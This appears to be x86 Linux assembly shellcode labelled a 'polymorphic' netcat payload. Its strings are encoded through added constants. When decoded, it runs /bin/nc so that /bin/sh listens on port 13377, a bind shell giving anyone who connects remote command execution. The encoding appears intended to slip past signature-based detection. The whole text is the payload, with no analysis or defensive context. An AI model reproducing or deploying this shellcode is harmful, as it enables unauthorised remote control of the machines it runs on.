; This is a polymorpic version of the NC
; Author Ian Mclachlan


section .text
    global _start
_start:

mov eax, 0x0
mov edx, 0x0

push 0x26262222
pop edx
add edx, 0x11111111
push edx
push 0x3170762d
mov edx, esp
push eax

push 0x57621e5d
pop ecx
add ecx, 0x11111111
push ecx
push 0x58511e54
pop ecx
add ecx, 0x11111111
push ecx
push 0x76766c2d
mov ecx,esp
push eax
push 0x525d1e1e
pop ebx
add ebx, 0x11111111
push ebx
push 0x2f2f2f2f
push 0x6e69622f
mov ebx, esp
push eax
push edx
push ecx
push ebx
mov edx, 0x0
mov  ecx,esp
mov al,11
int 0x80

